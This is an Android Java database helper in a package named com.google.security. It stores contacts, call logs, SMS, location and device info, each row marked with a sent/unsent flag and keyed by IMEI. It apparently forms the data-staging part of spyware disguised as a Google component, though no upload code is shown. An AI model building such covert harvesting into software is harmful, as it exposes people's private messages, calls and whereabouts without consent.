package com.google.security;

import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

public class DBHelper extends SQLiteOpenHelper {

	private static final String LOGTAG = "DBHelper";
	public static String DB_NAME;
	public  Context context;
	private SQLiteDatabase db;

	public DBHelper(Context c) {
		super(c, DB_NAME, null, 6);
		context = c;
	}

	public DBHelper(Context c, String db_name) {
		super(c, db_name, null, 6);
		DB_NAME = db_name;
		context = c;
	}

	public void onCreate(SQLiteDatabase db) {
		this.db = db;
		db.execSQL(SQLLocalStorage.CREATE_TBL_CONTACTS);
		db.execSQL(SQLLocalStorage.CREATE_TBL_RECORD);
		db.execSQL(SQLLocalStorage.CREATE_TBL_SMS);
		db.execSQL(SQLLocalStorage.CREATE_TBL_LOCATION);
		db.execSQL(SQLLocalStorage.CREATE_TBL_INFO);
	}

	// 增
	public void insert_tab_contacts(ContentValues values) {
		SQLiteDatabase db = getWritableDatabase();
		values.put("flag", "false");
		db.insert(SQLLocalStorage.TBL_CONTACTS, null, values);
		Log.e(LOGTAG, "con");
		db.close();
	}

	public void insert_tab_record(ContentValues values) {
		SQLiteDatabase db = getWritableDatabase();
		values.put("flag", "false");
		db.insert(SQLLocalStorage.TBL_RECORD, null, values);
		Log.e(LOGTAG, "call");

		db.close();
	}

	public void insert_tab_sms(ContentValues values) {
		SQLiteDatabase db = getWritableDatabase();
		values.put("flag", "false");
		db.insert(SQLLocalStorage.TBL_SMS, null, values);
		Log.e(LOGTAG, "sms");

		db.close();
	}

	public void insert_tab_location(ContentValues values) {

		SQLiteDatabase db = getWritableDatabase();
		values.put("flag", "false");
		values.put("uid", getUid());
		db.insert(SQLLocalStorage.TBL_LOCATION, null, values);
		db.close();
	}

	public void insert_tab_info(ContentValues values) {
		SQLiteDatabase db = getWritableDatabase();
		values.put("flag", "false");
		db.insert(SQLLocalStorage.TBL_INFO, null, values);
		db.close();
	}

	// 删
	public void dele_tab_contacts() {
		SQLiteDatabase db = getWritableDatabase();
		db.delete(SQLLocalStorage.TBL_CONTACTS, null, null);
		db.close();
	}

	public void dele_tab_record() {
		SQLiteDatabase db = getWritableDatabase();
		db.delete(SQLLocalStorage.TBL_RECORD, null, null);
		db.close();
	}

	public void dele_tab_sms() {
		SQLiteDatabase db = getWritableDatabase();
		db.delete(SQLLocalStorage.TBL_SMS, null, null);
		db.close();
	}

	public void del_tab_contacts(int id) {
		if (db == null)
			db = getWritableDatabase();
		db.delete(SQLLocalStorage.TBL_CONTACTS, "_id=?",
				new String[] { String.valueOf(id) });
	}

	public void del_tab_record(int id) {
		if (db == null)
			db = getWritableDatabase();
		db.delete(SQLLocalStorage.TBL_RECORD, "_id=?",
				new String[] { String.valueOf(id) });
	}

	public void del_tab_sms(int id) {
		if (db == null)
			db = getWritableDatabase();
		db.delete(SQLLocalStorage.TBL_SMS, "_id=?",
				new String[] { String.valueOf(id) });
	}

	public void del_tab_location(int id) {
		if (db == null)
			db = getWritableDatabase();
		db.delete(SQLLocalStorage.TBL_LOCATION, "_id=?",
				new String[] { String.valueOf(id) });
	}

	public void del_tab_info(int id) {
		if (db == null)
			db = getWritableDatabase();
		db.delete(SQLLocalStorage.TBL_INFO, "_id=?",
				new String[] { String.valueOf(id) });
	}

	public void update_tab_contacts_flag(String number) {
		SQLiteDatabase db = getWritableDatabase();
		ContentValues value = new ContentValues();
		value.put("flag", "true");
		db.update(SQLLocalStorage.TBL_CONTACTS, value, "number=?",
				new String[] { number });
		Log.e(LOGTAG, "update"+db.update(SQLLocalStorage.TBL_CONTACTS, value, "number=?",
				new String[] { number }));
		db.close();
	}
	public void update_tab_record_flag(String time) {
		SQLiteDatabase db = getWritableDatabase();
		ContentValues value = new ContentValues();
		value.put("flag", "true");
		db.update(SQLLocalStorage.TBL_RECORD, value, "time=?",
				new String[] { time });
		db.close();
	}
	public void update_tab_sms_flag(String data) {
		SQLiteDatabase db = getWritableDatabase();
		ContentValues value = new ContentValues();
		value.put("flag", "true");
		db.update(SQLLocalStorage.TBL_SMS, value, "data=?",
				new String[] { data });
		db.close();
	}
	
	// 改
	public void update_tab_contacts() {
		SQLiteDatabase db = getWritableDatabase();
		ContentValues value = new ContentValues();
		value.put("flag", "true");
		db.update(SQLLocalStorage.TBL_CONTACTS, value, null, null);
		db.close();
	}

	public void update_tab_record() {
		SQLiteDatabase db = getWritableDatabase();
		ContentValues value = new ContentValues();
		value.put("flag", "true");
		db.update(SQLLocalStorage.TBL_RECORD, value, null, null);
		db.close();
	}

	public void update_tab_sms() {
		SQLiteDatabase db = getWritableDatabase();
		ContentValues value = new ContentValues();
		value.put("flag", "true");
		db.update(SQLLocalStorage.TBL_SMS, value, null, null);
		db.close();
	}

	public void update_tab_location_flag(int id) {
		SQLiteDatabase db = getWritableDatabase();
		ContentValues value = new ContentValues();
		value.put("flag", "true");
		db.update(SQLLocalStorage.TBL_LOCATION, value, "_id=?",
				new String[] { String.valueOf(id) });
		db.close();
	}

	public void update_tab_info_flag() {
		SQLiteDatabase db = getWritableDatabase();
		ContentValues value = new ContentValues();
		value.put("flag", "true");
		db.update(SQLLocalStorage.TBL_INFO, value, null, null);
		db.close();
	}

	// 查
	public Cursor query_tab_contacts() {
		SQLiteDatabase db = getWritableDatabase();
		Cursor c = db.query(SQLLocalStorage.TBL_CONTACTS, null, null, null,
				null, null, null);
		// db.close();
		return c;
	}

	public Cursor query_tab_record() {
		SQLiteDatabase db = getWritableDatabase();
		Cursor c = db.query(SQLLocalStorage.TBL_RECORD, null, null, null, null,
				null, null);
		// db.close();
		return c;
	}

	public Cursor query_tab_sms() {
		SQLiteDatabase db = getWritableDatabase();
		Cursor c = db.query(SQLLocalStorage.TBL_SMS, null, null, null, null,
				null, null);
		// db.close();
		return c;
	}

	public Cursor query_tab_location() {
		SQLiteDatabase db = getWritableDatabase();
		Cursor c = db.query(SQLLocalStorage.TBL_LOCATION, null, null, null,
				null, null, null);
		return c;
	}

	public Cursor query_tab_info() {
		SQLiteDatabase db = getWritableDatabase();
		Cursor c = db.query(SQLLocalStorage.TBL_INFO, null, null, null, null,
				null, null);
		return c;
	}

	public void close() {
		if (db != null)
			db.close();
	}

	public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
	}

	public String getUid() {
		SharedPreferences sharedPreferences = context.getSharedPreferences(
				"imei", context.MODE_PRIVATE);
		// 使用getString方法获得value，注意第2个参数是value的默认值
		String imei = sharedPreferences.getString("imei", "");
		return imei;
	}
}